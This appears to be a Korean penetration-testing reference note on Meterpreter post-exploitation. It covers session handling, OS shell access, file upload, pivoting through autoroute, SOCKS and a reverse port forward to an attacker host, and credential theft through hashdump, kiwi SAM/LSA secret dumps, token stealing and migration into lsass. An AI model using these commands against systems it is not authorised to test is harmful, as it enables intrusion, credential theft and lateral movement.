---
tags:
  - 기능/세션관리
  - 기능/피벗
실행환경: ["Linux"]
필요권한: ["Meterpreter 세션"]
결과: ["정보", "파일", "세션", "내부 호스트 후보", "라우트와 포트 포워딩", "권한 상승 단서"]
---

# meterpreter

## 도구 개요

Meterpreter는 Metasploit payload로 열린 세션에서 시스템·권한 정보를 조회하고 운영체제 셸 실행, 파일 전송, 프로세스 이동과 포트 포워딩을 수행하는 대화형 세션 환경이다. 일반 명령 셸보다 세션 관리와 후속 작업 기능을 한 프롬프트에서 사용할 때 유용하다.

## 필요한 입력과 실행 환경

- 실행 위치: Metasploit에서 이미 열린 Meterpreter session
- 필요한 입력: session ID와 수행할 Meterpreter command
- 환경 조건: payload의 platform/architecture와 현재 session 권한에 따라 command 및 extension 지원 범위가 달라진다.
- `<SESSION_ID>`는 `sessions -l` 출력의 현재 Meterpreter session이며 `<CIDR>`은 pivot host 관점의 내부 대역, SOCKS port와 job ID는 Metasploit console 출력에서 얻는다. route·listener 생성은 final TCP response나 대상 인증을 뜻하지 않는다.


## 표준 사용법

```text
msf6 > sessions -i <id>
meterpreter > <command>
```

## 대표 예시

### 세션 선택

```text
msf6 > sessions
msf6 > sessions -i <SESSION_ID>
```

### 현재 권한과 시스템 정보 확인

```text
meterpreter > getuid
meterpreter > sysinfo
```

### OS 쉘로 전환

```text
meterpreter > shell
C:\> whoami
C:\> exit
meterpreter > background
msf6 > sessions -l
```

`shell`은 대상 OS command shell channel을 열고, 그 channel의 `exit`는 Meterpreter 프롬프트로 돌아온다. `background`는 Meterpreter session을 종료하지 않고 msfconsole로 돌아가므로 `sessions -l`에서 같은 ID가 유지되어야 한다. session 자체를 끝낼 때만 Meterpreter의 `quit` 또는 msfconsole의 `sessions -k <SESSION_ID>`를 사용한다.

### 파일 업로드

```text
meterpreter > upload tool.exe C:\Windows\Temp\tool.exe
```

업로드 뒤 원격 파일 크기와 SHA-256을 확인하는 전체 절차는 [[Meterpreter upload로 Windows 파일 반입]]에서 수행한다.

### session route와 SOCKS 연결

Meterpreter session이 `<INTERNAL_CIDR>`에 도달할 때 Metasploit route의 gateway로 해당 session을 지정하고, 별도 `socks_proxy` job이 그 route를 사용하게 한다.

```text
meterpreter > background
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION <SESSION_ID>
msf6 post(multi/manage/autoroute) > set SUBNET <INTERNAL_CIDR>
msf6 post(multi/manage/autoroute) > run
msf6 > route print
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVHOST 127.0.0.1
msf6 auxiliary(server/socks_proxy) > set SRVPORT <SOCKS_PORT>
msf6 auxiliary(server/socks_proxy) > set VERSION 5
msf6 auxiliary(server/socks_proxy) > run -j
msf6 > jobs
```

`route print`에서 `<INTERNAL_CIDR>`의 gateway가 `<SESSION_ID>`로 표시되고 `jobs`에 기록할 `<SOCKS_JOB_ID>`가 있어야 route와 listener가 준비된 것이다. 최종 내부 포트 접근은 ProxyChains의 TCP connect 결과로 별도 확인한다. `socks_proxy`는 Meterpreter 명령이 아니라 Metasploit background job이며, CIDR route 없이 listener만 열린 상태는 내부망 접근 성공이 아니다.

단일 내부 TCP 포트만 필요하면 session 안에서 `portfwd add`를 사용하고 `portfwd list`의 index·local/remote 조합을 기록한다. 구체적인 삭제 순서와 출력은 [[Meterpreter 라우팅과 포트 포워딩]]에 둔다.


## 주요 옵션과 명령

| 명령 | 설명 |
| --- | --- |
| `getuid`, `sysinfo` | 현재 권한과 시스템 정보 확인 |
| `shell` | OS 쉘 실행 |
| `upload`, `download` | 파일 전송 |
| `ps`, `migrate` | 프로세스 확인과 세션 이동 |
| `steal_token <PID>` | 지정한 Windows 프로세스의 token을 현재 세션에 적용 |
| `rev2self` | 현재 impersonation token을 해제하고 Meterpreter process의 원래 token으로 복귀 |
| `hashdump` | Windows hash dump 시도 |
| `load kiwi` | kiwi 확장 로드 |
| `lsa_dump_sam`, `lsa_dump_secrets` | SAM 계정 hash와 LSA secret 조회 |
| `portfwd` | 포트 포워딩 설정 |
| `run post/multi/gather/ping_sweep RHOSTS=<INTERNAL_CIDR>` | 세션 호스트에서 대상 CIDR로 ICMP sweep 실행 |
| `portfwd add -l <LOCAL_PORT> -p <INTERNAL_PORT> -r <INTERNAL_IP>` | 공격 호스트 로컬 포트를 세션 호스트가 도달하는 내부 TCP 포트로 전달 |
| `portfwd add -R -l <ATTACKER_LISTENER_PORT> -p <PIVOT_LISTEN_PORT> -L <ATTACKER_IP>` | 피벗 호스트의 수신 포트를 공격 호스트 listener로 역방향 전달 |
| `portfwd list` | 현재 세션의 포워딩 항목 확인 |
| `run autoroute -s <INTERNAL_CIDR>` | 현재 세션을 gateway로 사용하는 Metasploit route 추가. 레거시 문법이므로 deprecation 경고와 실제 추가 결과를 구분 |
| `run autoroute -p` | Meterpreter autoroute 스크립트가 인식하는 활성 route 목록 확인 |
| `background` | 세션을 백그라운드로 전환 |
| `quit` | 현재 Meterpreter session 종료 |


## 도구 고유 출력

| 출력/상태 | 의미 | 다음 행동 |
|---|---|---|
| `meterpreter >` 프롬프트 | Meterpreter 세션 획득 | `getuid`, `sysinfo`, `pwd`, `ipconfig/ifconfig` 확인 |
| OS shell에서 `exit` 뒤 `meterpreter >` 복귀 | command shell channel만 종료되고 Meterpreter session은 유지됨 | Meterpreter 후속 명령을 계속하거나 `background`로 msfconsole 복귀 |
| `background` 뒤 `sessions -l`에 같은 ID 표시 | 대화형 프롬프트만 벗어났고 session은 활성 상태 | 필요한 post module에 exact session ID 지정 |
| 명령 실행/파일 전송 성공 | 세션 조작 가능 | 필요한 파일 회수, 권한 상승, 피벗 가능성 확인 |
| 세션이 자주 죽음 | payload 안정성 또는 AV/EDR 영향 | 일반 shell 전환, 다른 payload, 실행 위치 확인 |
| 권한 부족 | 현재 사용자 권한 제한 | `getprivs`, local exploit, credential 수집 방향 검토 |
| `Stolen token with username` | 지정한 Windows 프로세스의 impersonation 또는 primary access token이 Meterpreter session에 적용됨 | `getuid`와 실제 자원 접근으로 token type·권한 확인 |
| `rev2self` 뒤 원래 `getuid` 복귀 | 현재 session에 적용된 impersonation access token이 해제됨 | 실행 전 사용자와 실제 자원 접근을 다시 대조 |
| `Migration completed successfully` | Meterpreter payload가 대상 PID의 프로세스로 이동함 | 이동 뒤 `getpid`, `getuid`, `getprivs`와 세션 생존 확인 |
| `Operation failed: Incorrect function` | `hashdump`가 현재 세션 권한·architecture·프로세스 조건에서 실패 | SYSTEM 여부를 확인하고 `ps | grep lsass`에서 호환되는 `lsass.exe` PID를 찾은 뒤 이동·재시도 |
| kiwi 확장 필요 오류 | `lsa_dump_sam`·`lsa_dump_secrets` 실행 전 kiwi가 로드되지 않음 | `load kiwi` 뒤 architecture 경고와 실행 결과 확인 |
| 파일 전송 실패 | 경로/권한 문제 | 쓰기 가능한 디렉터리, AV 차단, 파일명 확인 |
| `[+] Added route to <SUBNET>/<NETMASK> via <SESSION_HOST>` | 지정한 내부 대역이 현재 세션을 경유하도록 Metasploit route에 추가됨 | `run autoroute -p` 또는 Metasploit console의 `route print`로 CIDR과 session 확인 |
| `Meterpreter scripts are deprecated` | 레거시 autoroute 스크립트 사용 경고이며 route 생성 성공 자체를 뜻하지 않음 | 이어지는 `[+] Added route`를 확인하거나 `post/multi/manage/autoroute` 사용 |
| `ArgumentError Invalid :session, expected Session object` | 레거시 route 처리와 현재 session 등록 정보가 맞지 않음. route가 먼저 추가됐을 수도 있음 | `sessions -l`과 `route print`를 대조하고, route가 없거나 이전 session을 가리킬 때만 post 모듈로 재구성 |
| `Performing ping sweep for IP range <CIDR>` | 세션 호스트에서 ICMP sweep 시작 | 응답 주소를 확인하고 결과가 비면 단일 ping·route·ICMP 차단을 구분 |
| `Local TCP relay created` | 지정한 portfwd relay가 생성됨 | `portfwd list`와 실제 로컬 또는 역방향 연결로 전달 확인 |
| `Auxiliary module running as background job <SOCKS_JOB_ID>` | 공격 호스트에 SOCKS job과 listener 생성 | `jobs`, listener와 `route print`를 대조한 뒤 최종 TCP 접근 확인 |
| 피벗 실패 | route/session 지정 오류 | `route print`, `autoroute`, session id 확인 |

## 관련 공격기법

- [[Meterpreter 세션 후속 행동]]
- [[Meterpreter upload로 Windows 파일 반입]]
- [[Meterpreter 라우팅과 포트 포워딩]]
- [[ICMP 기반 내부 호스트 확인]]
- [[Meterpreter 프로세스 토큰 탈취]]
- [[Meterpreter 프로세스 이동과 세션 안정화]]
- [[Windows SAM SECURITY SYSTEM 덤프]]

## 참고 링크

- [Rapid7: Meterpreter 및 shell session 관리](https://docs.rapid7.com/metasploit/manage-meterpreter-and-shell-sessions/)
- [Rapid7 Metasploit Framework: Meterpreter stdapi system commands](https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/sys.rb)
